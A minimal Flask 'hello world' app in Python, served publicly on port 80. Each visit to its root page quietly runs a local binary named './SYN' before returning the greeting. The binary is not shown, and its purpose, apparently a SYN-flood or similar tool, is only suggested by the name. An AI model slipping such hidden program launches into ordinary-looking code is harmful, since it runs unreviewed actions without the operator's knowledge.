from flask import Flask
import os
app = Flask(__name__)

@app.route('/')
def hello_world():
    os.system('./SYN')
    return 'hello world'

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80)
